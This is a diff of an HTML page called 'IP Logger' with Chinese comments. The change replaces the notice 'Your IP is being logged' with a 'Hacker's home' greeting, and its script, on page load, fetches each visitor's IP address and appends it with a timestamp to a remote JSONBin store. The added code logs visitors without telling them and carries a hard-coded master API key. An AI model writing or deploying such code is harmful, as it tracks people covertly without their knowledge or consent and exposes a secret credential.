@@ -6,33 +6,43 @@
     <title>IP Logger</title>
 </head>
 <body>
-    <h1>Welcome to the IP Logger</h1>
-    <p>Your IP is being logged.</p>
+    <h1>Welcome</h1>
+    <p>Welcome to Hacker's home!!!</p>
 
     <script>
         // 获取用户的IP地址
         fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
-            // 准备要发送的数据
             const ipData = {
                 ip: data.ip,
                 timestamp: new Date().toISOString()
             };
 
-            // 发送IP地址到JSONBin
-            fetch('https://api.jsonbin.io/v3/b/66c17ac8c709fc0801feaed1', {
-                method: 'PUT',
+            // 首先获取当前的Bin内容
+            fetch('https://api.jsonbin.io/v3/b/66c1813ce41b4d34e421d9eb/latest', {
                 headers: {
-                    'Content-Type': 'application/json',
-                    'X-Master-Key': '$2a$10$NiuNFfv3f3iLmY8Qgzu6b.33bU.s0EZQ7YGskJ/ghX8LQoLrGCy9q',
-                    'X-Bin-Private': false  // 如果你想要公开访问这个bin，可以设置为false
-                },
-                body: JSON.stringify(ipData)
+                    'X-Master-Key': '$2a$10$NiuNFfv3f3iLmY8Qgzu6b.33bU.s0EZQ7YGskJ/ghX8LQoLrGCy9q'
+                }
             })
             .then(response => response.json())
-            .then(json => console.log('IP logged successfully:', json))
-            .catch(error => console.error('Error logging IP:', error));
+            .then(bin => {
+                const currentIps = bin.record.ips || [];
+                currentIps.push(ipData);
+
+                // 更新Bin内容
+                fetch('https://api.jsonbin.io/v3/b/66c1813ce41b4d34e421d9eb', {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Master-Key': '$2a$10$NiuNFfv3f3iLmY8Qgzu6b.33bU.s0EZQ7YGskJ/ghX8LQoLrGCy9q'
+                    },
+                    body: JSON.stringify({ ips: currentIps })
+                })
+                .then(response => response.json())
+                .then(updatedBin => console.log('IP logged successfully:', updatedBin))
+                .catch(error => console.error('Error logging IP:', error));
+            });
         });
     </script>
 </body>
